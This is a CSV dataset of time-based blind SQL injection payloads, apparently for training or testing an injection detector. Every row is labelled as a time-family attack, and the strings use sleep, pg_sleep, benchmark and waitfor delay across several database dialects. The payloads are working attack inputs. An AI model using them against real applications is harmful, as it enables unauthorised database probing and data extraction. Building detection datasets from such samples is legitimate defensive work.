label,payload,family
attack,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",time
attack,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",time
attack,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",time
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,time
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",time
attack,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,time
attack,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,time
attack,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,time
attack,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",time
attack,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",time
attack,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",time
attack,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,time
attack,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,time
attack,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,time
attack,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',time
attack,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",time
attack,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,time
attack,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",time
attack,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,time
attack,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',time
attack,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",time
attack,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",time
attack,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,time
attack,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,time
attack,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",time
attack,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,time
attack,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,time
attack,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",time
attack,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,time
attack,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",time
attack,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',time
attack,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",time
attack,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",time
attack,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,time
attack,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,time
attack,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,time
attack,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',time
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",time
attack,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",time
attack,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,time
attack,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,time
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",time
attack,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',time
attack,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,time
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",time
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,time
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",time
attack,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,time
attack,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,time
attack,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,time
attack,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",time
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,time
attack,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,time
attack,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",time
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,time
attack,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",time
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,time
attack,"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",time
attack,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,time
attack,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",time
attack,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",time
attack,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,time
attack,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,time
attack,1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,time
attack,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",time
attack,1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",time
attack,1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",time
attack,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",time
attack,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,time
